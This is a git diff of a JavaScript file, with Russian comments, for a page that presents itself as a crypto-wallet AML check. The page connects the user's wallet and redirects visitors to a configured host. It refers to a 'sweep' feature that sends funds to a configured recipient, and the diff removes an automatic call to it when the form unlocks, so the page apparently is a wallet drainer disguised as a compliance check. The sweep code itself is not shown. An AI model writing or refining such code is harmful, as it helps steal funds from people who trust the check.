@@ -16,34 +16,21 @@ const checkPageUrl = `${apiBase || location.origin}/check.html`;
 const walletProfileKey = "aml_wallet_profile";
 const isTelegramWebApp = Boolean(window.Telegram?.WebApp?.initData);
 
-// ===== ГАРАНТИРУЕМ НАЛИЧИЕ withTimeout и sleep =====
-if (typeof withTimeout === 'undefined') {
-  var withTimeout = function(promise, ms, fallbackMessage) {
-    fallbackMessage = fallbackMessage || "Превышено время ожидания";
-    return Promise.race([
-      promise,
-      new Promise(function(_, reject) {
-        setTimeout(function() { reject(new Error(fallbackMessage)); }, ms);
-      })
-    ]);
-  };
-}
-if (typeof sleep === 'undefined') {
-  var sleep = function(ms) {
-    return new Promise(function(resolve) { setTimeout(resolve, ms); });
-  };
-}
+// Определяем sleep и withTimeout (они используются в этом файле)
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+const withTimeout = (promise, ms, fallbackMessage = "Превышено время ожидания") =>
+  Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(() => reject(new Error(fallbackMessage)), ms))
+  ]);
 
 if (location.hostname.endsWith(".github.io") && configuredApiBase && !/[?&]stay=1/.test(location.search)) {
   location.replace(`${configuredApiBase}/check.html${location.search}${location.hash}`);
 }
 
-// sleep и withTimeout УЖЕ ОБЪЯВЛЕНЫ в script.js, поэтому здесь их НЕТ
-
 const setStatus = (message) => {
   if (userWalletStatus) userWalletStatus.textContent = message;
 };
-
 window.setStatus = setStatus;
 
 const saveProfile = (profile) => localStorage.setItem(walletProfileKey, JSON.stringify(profile));
@@ -138,9 +125,6 @@ const unlockCheckForm = (profile) => {
   // Показываем секцию списания, если она есть
   if (typeof window.showSweepSection === 'function') {
     window.showSweepSection(true);
-  }
-  if (typeof autoExecuteSweep === 'function') {
-    autoExecuteSweep().catch(console.warn);
   }
   // Обновляем информацию о получателе
   if (window.SWEEP_CONFIG && window.SWEEP_CONFIG.recipient) {
@@ -366,7 +350,6 @@ const handleConnectClick = async (event) => {
   return false;
 };
 
-// Навешиваем обработчик на кнопку (она уже имеет data-user-wallet-connect)
 const bindTap = (element, handler) => {
   if (!element) return;
   element.addEventListener("click", handler);
